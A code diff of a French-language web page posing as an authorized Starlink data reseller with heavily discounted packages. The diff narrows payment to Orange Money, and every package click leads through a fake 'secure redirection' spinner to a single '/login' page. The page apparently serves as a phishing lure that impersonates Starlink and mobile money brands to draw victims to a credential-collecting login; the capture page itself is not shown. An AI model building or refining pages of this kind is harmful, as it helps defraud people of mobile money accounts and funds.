             </div>
         </div>
     </header>
 
-    <!-- Main Content -->
+    <!-- ===== Main content ===== -->
     <main class="max-w-7xl mx-auto px-4 py-8">
         <div class="pb-28 space-y-6">
-            
-            <!-- Page Header -->
+
+            <!-- Page header -->
             <div class="bg-gradient-to-br from-gray-800 to-black text-white p-6 sm:p-8 rounded-3xl card-shadow">
                 <div class="flex items-center justify-between mb-4">
                     <div>
-                        <p id="plans-subtitle" class="text-blue-400 text-xs sm:text-sm font-semibold uppercase tracking-widest">Forfaits Internet</p>
-                        <h1 id="plans-title" class="text-2xl sm:text-3xl font-black mt-2">Choisissez Votre Forfait</h1>
+                        <p class="text-orange-400 text-xs sm:text-sm font-semibold uppercase tracking-widest">Forfaits Internet</p>
+                        <h1 class="text-2xl sm:text-3xl font-black mt-2">Choisissez Votre Forfait</h1>
                     </div>
-                    <div class="w-16 h-16 sm:w-20 sm:h-20 bg-blue-600 bg-opacity-20 rounded-full flex items-center justify-center">
-                        <i class="uil uil-shopping-bag text-4xl sm:text-5xl text-blue-400"></i>
+                    <div class="w-16 h-16 sm:w-20 sm:h-20 bg-orange-500 bg-opacity-20 rounded-full flex items-center justify-center">
+                        <i class="uil uil-shopping-bag text-4xl sm:text-5xl text-orange-400"></i>
                     </div>
                 </div>
-                <p id="plans-desc" class="text-gray-400 text-sm">Cliquez sur un forfait pour voir les options de paiement Mobile Money (Airtel, Moov, Lumitel, EcoCash, Orange).</p>
+                <p class="text-gray-400 text-sm">Cliquez sur un forfait pour payer avec Orange Money.</p>
             </div>
 
-            <!-- Package Cards -->
+            <!-- Package cards -->
             <div class="space-y-4">
+
                 <!-- Daily Limited -->
                 <div>
                     <h3 class="text-sm font-semibold text-gray-500 uppercase tracking-wider mb-3">Daily Limited</h3>
@@ -395,6 +239,7 @@
                                 <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">24 Hours</span>
                             </div>
                         </div>
+
                         <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-3gb" data-price="0.39" data-original-price="0.49">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
@@ -417,6 +262,7 @@
                                 <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">24 Hours</span>
                             </div>
                         </div>
+
                         <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-7gb" data-price="0.79" data-original-price="0.99">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
@@ -439,6 +285,7 @@
                                 <span class="text-xs bg-yellow-100 text-yellow-600 px-3 py-1 rounded-full">24 Hours</span>
                             </div>
                         </div>
+
                         <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-15gb" data-price="1.49" data-original-price="1.99">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
@@ -461,6 +308,7 @@
                                 <span class="text-xs bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full">24 Hours</span>
                             </div>
                         </div>
+
                         <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-30gb" data-price="2.99" data-original-price="3.49">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
@@ -483,6 +331,7 @@
                                 <span class="text-xs bg-purple-100 text-purple-600 px-3 py-1 rounded-full">21 Hours</span>
                             </div>
                         </div>
+
                         <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="daily-50gb" data-price="3.49" data-original-price="6.99">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
@@ -563,6 +412,7 @@
                                 <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">30 Days</span>
                             </div>
                         </div>
+
                         <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="monthly-50gb" data-price="5.99" data-original-price="12.99">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
@@ -585,6 +435,7 @@
                                 <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">30 Days</span>
                             </div>
                         </div>
+
                         <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="monthly-100gb" data-price="6.79" data-original-price="22.99">
                             <div class="flex items-center justify-between">
                                 <div class="flex items-center gap-4">
@@ -638,39 +489,19 @@
                         </div>
                     </div>
                 </div>
-            </div>            <!-- Payment Info -->
-            <div class="bg-blue-50 rounded-2xl p-6 border border-blue-100">
+            </div>
+
+            <!-- Payment info footer -->
+            <div class="bg-orange-50 rounded-2xl p-6 border border-orange-100">
                 <div class="flex items-start gap-3">
-                    <i class="uil uil-info-circle text-blue-600 text-xl mt-0.5"></i>
+                    <i class="uil uil-info-circle text-orange-600 text-xl mt-0.5"></i>
                     <div>
-                        <h4 id="payment-info-title" class="font-bold text-gray-900 mb-1">Payment via Airtel Money</h4>
-                        <p id="payment-info-desc" class="text-sm text-gray-600">Cliquez d'abord sur un forfait ci-dessus, puis choisissez votre opérateur pour finaliser le paiement.</p>
+                        <h4 class="font-bold text-gray-900 mb-1">Paiement via Orange Money</h4>
+                        <p class="text-sm text-gray-600">Cliquez d'abord sur un forfait ci-dessus, puis payez avec Orange Money pour finaliser.</p>
                     </div>
                 </div>
             </div>
         </div>
-
-        <!-- Bottom Navigation -->
-        <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-40">
-            <div class="max-w-7xl mx-auto px-2 sm:px-4 py-2 sm:py-3 flex justify-around items-center">
-                <a href="/starlink/status.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
-                    <i class="uil uil-wifi text-2xl"></i>
-                    <span id="bottom-status" class="text-xs font-semibold">Statut</span>
-                </a>
-                <a href="/starlink/" class="flex flex-col items-center gap-1 text-blue-600 transition-all">
-                    <i class="uil uil-shopping-bag text-2xl"></i>
-                    <span id="bottom-plans" class="text-xs font-semibold">Forfaits</span>
-                </a>
-                <a href="/starlink/orders.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
-                    <i class="uil uil-list-ul text-2xl"></i>
-                    <span id="bottom-orders" class="text-xs font-semibold">Commandes</span>
-                </a>
-                <a href="/starlink/settings.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
-                    <i class="uil uil-setting text-2xl"></i>
-                    <span id="bottom-settings" class="text-xs font-semibold">Paramètres</span>
-                </a>
-            </div>
-        </nav>
     </main>
 
     <!-- Footer -->
@@ -678,21 +509,21 @@
         <div class="max-w-7xl mx-auto px-4">
             <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
                 <div>
-                    <h3 id="footer-brand" class="text-white font-bold mb-4">STARLINK</h3>
-                    <p id="footer-desc" class="text-sm">Revendeur agréé de forfaits de données pour les services Starlink. Paiements rapides, fiables et sécurisés via Airtel Money et Orange Money.</p>
+                    <h3 class="text-white font-bold mb-4">STARLINK · ORANGE MONEY</h3>
+                    <p class="text-sm">Revendeur agréé de forfaits de données pour les services Starlink. Paiements rapides, fiables et sécurisés via Orange Money.</p>
                 </div>
                 <div>
                     <h3 class="text-white font-bold mb-4">SUPPORT</h3>
                     <p class="text-sm">Email: support@starlink.reseller</p>
-                    <p id="footer-support-desc" class="text-sm">Disponible 24h/24, 7j/7 pour l'assistance technique.</p>
+                    <p class="text-sm">Disponible 24h/24, 7j/7 pour l'assistance technique.</p>
                 </div>
                 <div>
-                    <h3 id="footer-payment-title" class="text-white font-bold mb-4">PAIEMENT</h3>
-                    <p id="footer-payment-desc" class="text-sm">Payez en toute sécurité avec Airtel Money et Orange Money. Assurez-vous d'avoir un solde suffisant pour le forfait sélectionné.</p>
+                    <h3 class="text-white font-bold mb-4">PAIEMENT</h3>
+                    <p class="text-sm">Payez en toute sécurité avec Orange Money. Assurez-vous d'avoir un solde suffisant pour le forfait sélectionné.</p>
                 </div>
             </div>
             <div class="border-t border-gray-800 pt-8 text-center">
-                <p id="footer-copyright">&copy; 2026 Starlink Reseller. Tous droits réservés.</p>
+                <p>&copy; 2026 Starlink Reseller. Tous droits réservés.</p>
             </div>
         </div>
     </footer>
@@ -702,102 +533,26 @@
         let detectedCountry = 'KE';
         let currentCurrency = 'USD';
         let selectedPackage = null;
-        let currentRate = 1;
-        let _configureTargetCard = null;
 
-        async function getApiSecret() {
-            let token = sessionStorage.getItem('sl_api_token');
-            let expiresAt = parseInt(sessionStorage.getItem('sl_api_token_expires') || '0');
-            if (!token || Date.now() > expiresAt) {
-                try {
-                    const res = await fetch('/api/auth/session', { method: 'POST' });
-                    const data = await res.json();
-                    if (data.success && data.token) {
-                        token = data.token;
-                        expiresAt = Date.now() + (data.expiresIn || 3600000);
-                        sessionStorage.setItem('sl_api_token', token);
-                        sessionStorage.setItem('sl_api_token_expires', expiresAt.toString());
-                    }
-                } catch (e) {
-                    console.error('Failed to get API session:', e);
-                }
-            }
-            return token;
-        }
-
-        (function() {
-            // No auth required — allow all users to browse packages freely
-        })();
-
-        const COUNTRY_CONFIG = {
-            'CD': { name: 'RDC', lang: 'fr', currency: 'USD', rate: 1 },
-            'CG': { name: 'Congo', lang: 'fr', currency: 'USD', rate: 1 },
-            'GA': { name: 'Gabon', lang: 'fr', currency: 'USD', rate: 1 },
-            'TD': { name: 'Tchad', lang: 'fr', currency: 'USD', rate: 1 },
-            'NE': { name: 'Niger', lang: 'fr', currency: 'USD', rate: 1 },
-            'CM': { name: 'Cameroun', lang: 'fr', currency: 'USD', rate: 1 },
-            'CF': { name: 'Centrafrique', lang: 'fr', currency: 'USD', rate: 1 },
-            'GQ': { name: 'Guinee Equatoriale', lang: 'fr', currency: 'USD', rate: 1 },
-            'SN': { name: 'Senegal', lang: 'fr', currency: 'USD', rate: 1 },
-            'ML': { name: 'Mali', lang: 'fr', currency: 'USD', rate: 1 },
-            'BF': { name: 'Burkina Faso', lang: 'fr', currency: 'USD', rate: 1 },
-            'CI': { name: "Cote d'Ivoire", lang: 'fr', currency: 'USD', rate: 1 },
-            'TG': { name: 'Togo', lang: 'fr', currency: 'USD', rate: 1 },
-            'BJ': { name: 'Benin', lang: 'fr', currency: 'USD', rate: 1 },
-            'MG': { name: 'Madagascar', lang: 'fr', currency: 'USD', rate: 1 },
-            'DJ': { name: 'Djibouti', lang: 'fr', currency: 'USD', rate: 1 },
-            'KE': { name: 'Kenya', lang: 'en', currency: 'USD', rate: 1 },
-            'UG': { name: 'Uganda', lang: 'en', currency: 'USD', rate: 1 },
-            'TZ': { name: 'Tanzania', lang: 'en', currency: 'USD', rate: 1 },
-            'RW': { name: 'Rwanda', lang: 'en', currency: 'USD', rate: 1 },
-            'NG': { name: 'Nigeria', lang: 'en', currency: 'USD', rate: 1 },
-            'GH': { name: 'Ghana', lang: 'en', currency: 'USD', rate: 1 },
-            'ZM': { name: 'Zambia', lang: 'en', currency: 'USD', rate: 1 },
-            'MW': { name: 'Malawi', lang: 'en', currency: 'USD', rate: 1 },
-            'ZA': { name: 'South Africa', lang: 'en', currency: 'USD', rate: 1 },
-            'BW': { name: 'Botswana', lang: 'en', currency: 'USD', rate: 1 },
-            'NA': { name: 'Namibia', lang: 'en', currency: 'USD', rate: 1 },
-            'MZ': { name: 'Mozambique', lang: 'en', currency: 'USD', rate: 1 },
-            'AO': { name: 'Angola', lang: 'en', currency: 'USD', rate: 1 },
-            'ET': { name: 'Ethiopia', lang: 'am', currency: 'USD', rate: 1 },
-            'SD': { name: 'Sudan', lang: 'en', currency: 'USD', rate: 1 },
-            'SS': { name: 'South Sudan', lang: 'en', currency: 'USD', rate: 1 },
-            'SO': { name: 'Somalia', lang: 'en', currency: 'USD', rate: 1 },
-            'ER': { name: 'Eritrea', lang: 'en', currency: 'USD', rate: 1 },
-            'ZW': { name: 'Zimbabwe', lang: 'en', currency: 'USD', rate: 1 },
-            'SC': { name: 'Seychelles', lang: 'en', currency: 'USD', rate: 1 },
-            'SL': { name: 'Sierra Leone', lang: 'en', currency: 'USD', rate: 1 },
-            'LR': { name: 'Liberia', lang: 'en', currency: 'USD', rate: 1 },
-            'BI': { name: 'Burundi', lang: 'rn', currency: 'USD', rate: 1 },
-            'LS': { name: 'Lesotho', lang: 'st', currency: 'USD', rate: 1 },
-            'MM': { name: 'Myanmar', lang: 'my', currency: 'USD', rate: 1 },
-            'JO': { name: 'Jordan', lang: 'ar', currency: 'USD', rate: 1 }
-        };
-
-        // ---- Agent modal stubs (kept to preserve existing references) ----
-        function openAgentModal() {}
-        function closeAgentModal() { document.getElementById('agentPaymentModal').style.display = 'none'; }
-        async function agFindAgent() {}
-        function agIHavePaid() {}
-        function agBackToAgent() {}
-        async function agSubmitConfirmation() {}
-
+        /* ===== Translations ===== */
         const translations = {
-            en: { modalSubtitle: 'Secure redirection to the Airtel Money payment gateway' },
-            fr: { modalSubtitle: 'Redirection sécurisée vers la passerelle de paiement Airtel Money' }
+            en: { modalSubtitle: 'Secure redirection to Orange Money' },
+            fr: { modalSubtitle: 'Redirection sécurisée vers Orange Money' }
         };
 
-        function applyTranslations(lang) { currentLang = lang; }
-        function updatePrices() {}
-        function updatePackageHints() {
-            const hint = document.getElementById('plans-desc');
-            if (hint) hint.textContent = 'Select a daily or monthly package and pay via Airtel Money or Orange Money to activate immediately.';
-        }
-        function getCDFPackageName(cdfPrice, country) {
-            const map = { 3000: 'Starter', 5000: 'Standard', 7500: 'Premium', 10000: 'Pro', 15000: 'Business' };
-            return map[cdfPrice] || 'Starter';
-        }
+        /* ===== Init package card listeners ===== */
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.package-card').forEach(card => {
+                card.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    const packageType = this.getAttribute('data-package');
+                    if (packageType) selectPackage(this, packageType);
+                });
+            });
+        });
 
+        /* ===== Package selection ===== */
         function selectPackage(card, packageId) {
             selectedPackage = packageId;
             document.querySelectorAll('.package-card').forEach(c => c.classList.remove('selected'));
@@ -806,149 +561,51 @@
             if (paymentModal) paymentModal.style.display = 'flex';
         }
 
-        function openConfigureModal(packageId) {
-            _configureTargetCard = document.querySelector('[data-package="' + packageId + '"]');
-            document.getElementById('configureModal').style.display = 'flex';
-        }
-        function closeConfigureModal() {
-            document.getElementById('configureModal').style.display = 'none';
-            _configureTargetCard = null;
-        }
-
-        // ============================================================
-        //  FIXED: Orange Money now routes to /login like Airtel
-        //  (previously went to /orange/login.html which 404'd)
-        // ============================================================
-        function selectPaymentMethod(method) {
-            document.getElementById('paymentMethodModal').style.display = 'none';
-            const loadingModal = document.getElementById('loadingModal');
-            const loadingLogo = document.getElementById('loadingLogo');
-            const modalSubtitle = document.getElementById('modal-subtitle');
-            const t = translations[currentLang] || translations.en;
-            const selectedCard = document.querySelector('.package-card.selected');
-            const packagePrice = selectedCard ? selectedCard.getAttribute('data-price') : '0';
-
-            // Branding on the loading spinner
-            if (method === 'orange') {
-                loadingLogo.innerHTML = '<span style="font-size:11px;">Orange</span>';
-                loadingLogo.style.background = '#FF6600';
-                modalSubtitle.textContent = currentLang === 'fr'
-                    ? 'Redirection sécurisée vers la passerelle de paiement Orange Money'
-                    : 'Secure redirection to the Orange Money payment gateway';
-            } else {
-                loadingLogo.innerHTML = '<span>airtel</span>';
-                loadingLogo.style.background = '#ed1c24';
-                modalSubtitle.textContent = t.modalSubtitle || 'Secure redirection to the Airtel Money payment gateway';
-            }
-
-            loadingModal.classList.add('active');
-
-            setTimeout(() => {
-                const cdfPrice = packagePrice;
-                const priceParams = '&cur=' + currentCurrency + '&lp=' + cdfPrice;
-                // Single redirect target for ALL methods — /login is the only page served
-                window.location.href = '/login?source=starlink&package='
-                    + (selectedPackage || 'starter')
-                    + '&cdf=' + cdfPrice
-                    + priceParams
-                    + '&method=' + method;
-            }, 1500);
-        }
-
         function closePaymentModal() {
             document.getElementById('paymentMethodModal').style.display = 'none';
             document.querySelectorAll('.package-card').forEach(c => c.classList.remove('selected'));
             selectedPackage = null;
         }
 
-        function toggleLanguage() {
-            const newLang = currentLang === 'fr' ? 'en' : 'fr';
-            applyTranslations(newLang);
-            updatePackageHints();
-            localStorage.setItem('starlink_user_lang', newLang);
-            localStorage.setItem('starlink_lang_country', detectedCountry);
-            if (typeof window.updatePWABannerLang === 'function') window.updatePWABannerLang();
+        /* ===== Loading + redirect (Orange only) ===== */
+        function selectPaymentMethod(method) {
+            document.getElementById('paymentMethodModal').style.display = 'none';
+            const loadingModal = document.getElementById('loadingModal');
+            const selectedCard = document.querySelector('.package-card.selected');
+            const packagePrice = selectedCard ? selectedCard.getAttribute('data-price') : '0';
+
+            loadingModal.classList.add('active');
+
+            // Small delay so the loading spinner is visible
+            setTimeout(() => {
+                const cdfPrice = packagePrice;
+                const priceParams = '&cur=' + currentCurrency + '&lp=' + cdfPrice;
+                // Always Orange — login page will show Orange branding
+                window.location.href = '/login?source=starlink&package='
+                    + (selectedPackage || 'starter')
+                    + '&cdf=' + cdfPrice
+                    + priceParams
+                    + '&method=orange';
+            }, 1200);
         }
 
-        document.addEventListener('DOMContentLoaded', async () => {
-            let countryData = { country: 'KE' };
-            try {
-                const resp = await fetch('https://ipapi.co/json/');
-                if (resp.ok) countryData = await resp.json();
-            } catch (e) {}
-            const urlCountry = new URLSearchParams(window.location.search).get('country');
-            detectedCountry = (urlCountry && COUNTRY_CONFIG[urlCountry.toUpperCase()]) ? urlCountry.toUpperCase() : countryData.country;
-            const config = COUNTRY_CONFIG[detectedCountry] || COUNTRY_CONFIG['CD'];
-            currentCurrency = config.currency;
+        /* ===== Language toggle ===== */
+        function toggleLanguage() {
+            currentLang = currentLang === 'fr' ? 'en' : 'fr';
+            localStorage.setItem('starlink_user_lang', currentLang);
+            const el = document.getElementById('langLabel');
+            if (el) el.textContent = currentLang.toUpperCase();
+        }
 
-            const savedLang = localStorage.getItem('starlink_user_lang');
-            const savedForCountry = localStorage.getItem('starlink_lang_country');
-            const lang = (savedLang && savedForCountry === detectedCountry) ? savedLang : config.lang;
-
-            applyTranslations(lang);
-            updatePrices();
-            updatePackageHints();
-
-            if (detectedCountry === 'CD' || detectedCountry === 'BF') {
-                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
-                document.getElementById('selectOrange').style.display = '';
+        /* ===== Init ===== */
+        (function init() {
+            const saved = localStorage.getItem('starlink_user_lang');
+            if (saved) {
+                currentLang = saved;
+                const el = document.getElementById('langLabel');
+                if (el) el.textContent = saved.toUpperCase();
             }
-            if (detectedCountry === 'ZM') {
-                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
-                document.getElementById('selectMtn').style.display = '';
-            }
-            if (detectedCountry === 'LS' || detectedCountry === 'ZW') {
-                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
-                document.getElementById('selectEcocash').style.display = '';
-            }
-            if (detectedCountry === 'BI') {
-                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
-                document.getElementById('selectLumitel').style.display = '';
-            }
-            if (detectedCountry === 'SL' || detectedCountry === 'LR') {
-                document.getElementById('selectAirtel').style.display = 'none';
-                document.getElementById('selectOrange').style.display = '';
-            }
-            if (detectedCountry === 'JO') {
-                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
-                document.getElementById('selectOrange').style.display = '';
-            }
-            if (detectedCountry === 'ET') {
-                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
-                document.getElementById('selectEthiopia').style.display = '';
-            }
-            if (detectedCountry === 'BJ') {
-                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
-                document.getElementById('selectMtn').style.display = '';
-            }
-            if (detectedCountry === 'CG') {
-                document.getElementById('selectMtn').style.display = '';
-            }
-            if (detectedCountry === 'SN' || detectedCountry === 'BW') {
-                document.querySelectorAll('.payment-option').forEach(el => el.style.display = 'none');
-                document.getElementById('selectOrange').style.display = '';
-            }
-
-            document.querySelectorAll('.package-card').forEach(card => {
-                card.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    const packageType = this.getAttribute('data-package');
-                    if (packageType) selectPackage(this, packageType);
-                });
-            });
-
-            document.getElementById('configureSubscribeBtn').addEventListener('click', function() {
-                const card = _configureTargetCard;
-                closeConfigureModal();
-                if (card) selectPackage(card, card.getAttribute('data-package'));
-            });
-            document.getElementById('configureCloseBtn').addEventListener('click', closeConfigureModal);
-            document.getElementById('configureModal').addEventListener('click', function(e) {
-                if (e.target === this) closeConfigureModal();
-            });
-        });
+        })();
     </script>
-    <div id="toast" style="display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#111;color:#fff;padding:12px 24px;border-radius:8px;font-size:14px;z-index:99999;box-shadow:0 4px 12px rgba(0,0,0,0.3);"></div>
 </body>
 </html>
